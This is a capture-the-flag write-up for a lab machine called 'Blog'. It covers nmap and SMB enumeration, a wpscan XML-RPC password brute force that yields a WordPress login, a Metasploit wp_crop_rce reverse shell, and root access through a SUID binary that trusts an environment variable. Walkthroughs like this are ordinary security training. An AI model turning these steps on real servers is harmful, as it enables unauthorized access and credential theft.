# Blog

Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!
Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

## Recon

`nmap -A -T4 blog.thm`

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)


Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-03-18T02:40:25
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2026-03-18T02:40:25+00:00

```

# Initial Access 

> Server Message Block (SMB) has message signing disabled, effectively allowing anonymous login. Smbclient can be used to enumerate and access SMB files: 

- Enumerate shares: `smbclient -L blog.thm -N` 
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
BillySMB        Disk      Billy's local SMB Share
IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
```

- Connect to the BillySMB share: `smbclient //blog.thm/BillySMB -U anonymous -N`
```
Alice-White-Rabbit.jpg              N    33378  Wed May 27 02:17:01 2020
tswift.mp4                          N  1236733  Wed May 27 02:13:45 2020
check-this.png                      N     3082  Wed May 27 02:13:43 2020
```

Nothing significant.  
Moving on... 

>  Port 80 is running. Navigating to `http://blog.thm`, the web app is using Wordpress and the technology profiler Wappalyzer indicates that it is using `Wordpress 5.0`.

- Wpscan can be used to further assess the endpoint for Wordpress vulnerabilities: `wpscan --update` and `wpscan --url http://blog.thm`
 
```
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
 |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://blog.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 3.0
 | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:09 <===================================================================================================================================> (137 / 137) 100.00% Time: 00:00:09

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1
Trying kwheel / dallas1 Time: 00:05:25 <                                                                                                                                 > (2865 / 14347257)  0.01%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: kwheel, Password: ********
```
 
# Exploitation

The Metasploit Framework can be used to exploit Wordpress. 

- Run `msfconsole` and `search wordpress 5.0`
	The `exploit/multi/http/wp_crop_rce` module can be used to obtain a reverse shell connection. Set `LHOST`, `LPORT`, `RHOSTS`, `USERNAME` and `PASSWORD` then run the exploit

- Manual checking for privesc can be done, however I chose to drop `linpeas` into the `/tmp` directory to enumerate privesc vectors: 

`-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SGID binary)`

By running this binary and reading the human-readable output of this binary by running `strings /usr/sbin/checker`, it's an ELF binary compiled with gcc that imports `getenv`, `setuid`, `system` and `puts` that checks if the `admin` environment variable is set to true. If it is, it sets the UID and spawns a bash shell. If not, it puts "Not an Admin" as output. 

- By running `export admin=true`, we can set the admin environment variable to true, run the binary and escalate privileges. Root flag has been obtained. 

- Run `find / -name user.txt` to find the user flag.
